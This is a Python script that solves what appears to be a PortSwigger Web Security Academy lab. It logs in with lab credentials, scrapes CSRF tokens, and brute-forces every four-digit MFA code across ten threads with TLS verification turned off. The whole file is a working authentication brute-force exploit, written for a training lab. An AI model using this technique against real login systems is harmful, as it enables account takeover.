import requests
import re
import urllib3
import sys

from concurrent.futures import ThreadPoolExecutor, as_completed

proxies = {
    # "https": "http://127.0.0.1:8080"
}

def try_pin_code(login_url, login_url_pin, pin_code) -> bool:

    if int(pin_code) % 100 == 0:
        print(f"[+] Done: {pin_code}")

    session = requests.session()
    session.proxies.update(proxies)
    session.verify = False

    response = session.get(login_url)
    content = response.content.decode()
    # print(content)
    
    regex = r'<input required type="hidden" name="csrf" value="(.*)">'
    match = re.search(regex, content)
    # print(session.cookies)

    assert match is not None
    csrf = match.group(1)

    data = {
        "csrf": csrf,
        "username": "carlos",
        "password": "montoya"
    }

    response = session.post(login_url, data=data)
    # print(response.content.decode())

    response = session.get(login_url_pin)
    content = response.content.decode()

    regex = r'<input required type="hidden" name="csrf" value="(.*)">'
    match = re.search(regex, content)
    # print(session.cookies)

    assert match is not None
    if match:
        # print(match.group(1))
        csrf = match.group(1)

    data = {
        'csrf': csrf,
        'mfa-code': pin_code
    }

    response = session.post(login_url_pin, data=data)
    content = response.content.decode()

    assert "Invalid CSRF token" not in content
    if "Incorrect security code" not in content:

        print(f"[+] Found MFA pin code: {pin_code}")
        sys.exit(0)

def main():

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    login_url = "https://acef1f221f69f477c0c75fcc00c300f0.web-security-academy.net/login"
    login_url_pin = "https://acef1f221f69f477c0c75fcc00c300f0.web-security-academy.net/login2"
    
    processes = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        for x in range(0, 10000):

            num = f"{x:04}"

            processes.append(executor.submit(try_pin_code, login_url, login_url_pin, num))

    for task in as_completed(processes):
        print(task.result())


if __name__ == '__main__':
    main()
